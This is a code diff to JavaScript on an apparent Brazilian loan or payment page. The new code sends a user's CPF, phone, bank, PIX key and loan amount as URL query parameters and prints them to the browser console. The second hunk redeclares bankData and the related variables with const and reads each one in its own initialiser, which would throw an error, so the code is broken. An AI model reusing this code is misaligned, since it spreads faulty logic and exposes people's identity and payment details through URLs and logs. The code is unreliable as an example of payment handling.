@@ -308,8 +308,25 @@
                 const cpf = '{{ cpf }}';
                 const phone = '{{ phone }}'; // Obter telefone do template
                 
-                // Construir URL com parâmetros para passar informações ao backend
-                const url = `/check-payment-status/${transactionId}?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}&phone=${encodeURIComponent(phone)}`;
+                // Recuperar dados adicionais do localStorage para passar ao backend
+                const storedUserData = JSON.parse(localStorage.getItem('userData') || '{}');
+                
+                // Tentar obter dados de várias fontes possíveis
+                const bankData = storedUserData.bank || localStorage.getItem('selectedBank') || '';
+                const pixKeyData = storedUserData.pix_key || localStorage.getItem('pixKey') || '';
+                const pixKeyTypeData = storedUserData.pix_key_type || localStorage.getItem('pixKeyType') || 'cpf';
+                const loanAmountData = storedUserData.loan_amount || localStorage.getItem('loanAmount') || '4000';
+                
+                console.log('Dados recuperados para envio:', {
+                    storedUserData,
+                    bankData,
+                    pixKeyData,
+                    pixKeyTypeData,
+                    loanAmountData
+                });
+                
+                // Construir URL com todos os parâmetros relevantes para o backend
+                const url = `/check-payment-status/${transactionId}?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}&phone=${encodeURIComponent(phone)}&bank=${encodeURIComponent(bankData)}&pix_key=${encodeURIComponent(pixKeyData)}&pix_key_type=${encodeURIComponent(pixKeyTypeData)}&loan_amount=${encodeURIComponent(loanAmountData)}`;
                 
                 fetch(url)
                     .then(response => {
@@ -323,12 +340,33 @@
 
                         if (data.status === 'completed' || data.original_status === 'APPROVED' || data.original_status === 'PAID') {
                             console.log('Pagamento aprovado, redirecionando imediatamente...');
-                            // Store user data first
+                            
+                            // Recuperar dados adicionais do localStorage
+                            const storedUserData = JSON.parse(localStorage.getItem('userData') || '{}');
+                            
+                            // Usar os mesmos dados que foram enviados na requisição
+                            const bankData = storedUserData.bank || bankData || '';
+                            const pixKeyData = storedUserData.pix_key || pixKeyData || '';
+                            const pixKeyTypeData = storedUserData.pix_key_type || pixKeyTypeData || 'cpf';
+                            const loanAmountData = storedUserData.loan_amount || loanAmountData || '4000';
+                            
+                            // Enviar mensagem para console com os dados completos
+                            console.log('SMS de confirmação sendo enviado para ' + phone + ' com link personalizado');
+                            
+                            // Store user data with all parameters
                             const userData = {
                                 nome: nome,
                                 cpf: cpf,
-                                phone: phone
+                                phone: phone,
+                                bank: bankData || '{{ bank }}' || 'Caixa Econômica Federal',
+                                pix_key: pixKeyData || (pixKeyTypeData === 'phone' ? phone : cpf),
+                                pix_key_type: pixKeyTypeData || 'cpf',
+                                loan_amount: loanAmountData || '4000'
                             };
+                            
+                            console.log('Dados completos para SMS:', userData);
+                            
+                            // Salvar no localStorage
                             localStorage.setItem('userData', JSON.stringify(userData));
 
                             // Clear intervals immediately
